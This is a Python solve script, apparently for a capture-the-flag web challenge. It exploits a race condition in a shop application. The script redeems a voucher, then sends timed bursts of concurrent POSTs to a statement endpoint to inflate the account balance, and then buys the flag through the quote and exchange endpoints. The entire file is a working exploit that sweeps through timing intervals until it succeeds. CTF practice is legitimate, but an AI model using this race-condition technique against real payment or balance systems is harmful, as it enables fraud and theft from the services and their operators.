#!/usr/bin/env python3
import re
import sys
import time
import threading

FLAG_RE = re.compile(r"ctf4b\{[^}]*\}")
BASE = "URL"
COUPON = "SPECIAL_VOUCHER_FOR_CTF4B"
FLAG_PRICE = 260
FIRE = 6
INTERVALS = [round(0.085 + 0.0075 * i, 4) for i in range(40)]
ATTEMPTS_PER_INTERVAL = 2


def make_client(base):
    import httpx
    return httpx.Client(base_url=base, timeout=30, follow_redirects=True)


def balance_of(client) -> int:
    html = client.get("/").text
    m = re.search(r'id="balance"[^>]*>\s*(-?\d+)', html)
    return int(m.group(1)) if m else -1


def fire_statements(client, interval: float, n: int) -> None:
    start = time.monotonic()

    def worker(k: int) -> None:
        deadline = start + k * interval
        while time.monotonic() < deadline:
            time.sleep(0.0005)
        try:
            client.post("/support/statement", headers={"Accept": "application/json"})
        except Exception:
            pass

    threads = [threading.Thread(target=worker, args=(k,)) for k in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


def try_grab_flag(client):
    q = client.post(
        "/cart/quote",
        json={"item": "flag"},
        headers={"Accept": "application/json"},
    )
    if q.status_code != 201:
        return None
    quote = q.json().get("quote")
    if not quote:
        return None
    r = client.post(
        "/exchange",
        json={"quote": quote},
        headers={"Accept": "application/json"},
    )
    m = FLAG_RE.search(r.text)
    return m.group() if m else None


def main() -> None:
    base = (sys.argv[1] if len(sys.argv) > 1 else BASE).rstrip("/")

    best = 0
    for interval in INTERVALS:
        for _ in range(ATTEMPTS_PER_INTERVAL):
            client = make_client(base)
            client.get("/")
            client.post("/redeem", json={"code": COUPON},
                        headers={"Accept": "application/json"})

            fire_statements(client, interval, FIRE)

            bal = balance_of(client)
            best = max(best, bal)
            flag = try_grab_flag(client)
            print(f"interval={interval:.4f}s  balance={bal:>4}  best={best:>4}"
                  + (f"  <-- {flag}" if flag else ""))
            if flag:
                print("\nFLAG:", flag)
                return
            client.close()

    print(f"\nno flag — best balance {best} (need {FLAG_PRICE})")


if __name__ == "__main__":
    main()
